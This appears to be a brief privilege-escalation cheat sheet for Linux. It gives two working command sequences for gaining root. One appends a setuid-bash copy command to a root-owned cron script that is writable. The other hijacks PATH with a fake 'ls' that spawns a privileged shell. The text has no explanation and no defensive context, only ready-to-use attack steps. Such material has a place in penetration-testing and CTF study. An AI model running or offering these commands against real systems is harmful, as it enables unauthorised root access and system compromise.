
Hijackng any jobs with root priv

echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash" >> /path/to/writable_cron_script.sh

------------------------------------------------------------------------------------

Path Hijacking..

echo "/bin/bash -p" > /tmp/ls
chmod +x /tmp/ls
export PATH=/tmp:$PATH
